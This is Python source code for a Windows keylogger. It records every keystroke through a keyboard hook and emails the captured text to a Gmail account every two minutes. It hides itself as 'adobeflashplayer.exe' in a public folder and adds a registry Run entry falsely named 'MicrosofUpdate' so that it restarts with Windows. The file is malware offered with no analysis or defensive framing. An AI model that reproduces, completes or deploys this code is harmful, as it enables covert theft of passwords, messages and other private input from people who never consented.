import pythoncom, pyHook
from os import path
from sys import exit
import threading
import urllib,urllib2
import smtplib
import datetime,time
import win32com.client
import win32event, win32api, winerror
from _winreg import *

mutex = win32event.CreateMutex(None, 1, 'N0tAs519n')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "err"
    exit(0)
x=''
data=''
count=0

dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"

def startup():
    shutil.copy(sys.argv[0],dir)
    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
if path.isfile(dir) == False:
    startup()	

class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>50:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER = EEMAIL
                PASS = EPASS
                FROM = USER
                TO = [USER]
                SUBJECT = "B33: "+str(ts) 
                MESSAGE =  data 
                message = """\ 
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)

def main():
    global x
    em4=TimerClass()
    em4.start()
    return True

if __name__ == '__main__':
    main()

def pushing(event):
    global x,data
    if event.Ascii==13:
        e4Ch=' [ENTER] '
    elif event.Ascii==8:
        e4Ch=' [BACKSPACE] '
    elif (event.Ascii == 162 or event.Ascii == 163):
        e4Ch = ' [CTRL] '
    elif (event.Ascii == 164 or event.Ascii == 165):
        e4Ch = ' [ALT] '
    elif (event.Ascii == 160 or event.Ascii == 161):
        e4Ch = ' [SHIFT] '
    elif (event.Ascii == 46):
        e4Ch = ' [DELETE] '
    elif (event.Ascii == 32):
        e4Ch = ' [SPACE] '
    elif (event.Ascii == 27):
        e4Ch = ' [ESC] '
    elif (event.Ascii == 9):
        e4Ch = ' [TAB] '
    elif (event.Ascii == 20):
        e4Ch = ' [CAPSLOCK] '
    elif (event.Ascii == 38):
        e4Ch = ' [UP] '
    elif (event.Ascii == 40):
        e4Ch = ' [DOWN] '
    elif (event.Ascii == 37):
        e4Ch = ' [LEFT] '
    elif (event.Ascii == 39):
        e4Ch = ' [RIGHT] '
    elif (event.Ascii == 91):
        e4Ch = ' [SUPER] '
    else:
        e4Ch=chr(event.Ascii)
    data=data+e4Ch 
    
obj = pyHook.HookManager()
obj.KeyDown = pushing
obj.HookKeyboard()
pythoncom.PumpMessages()
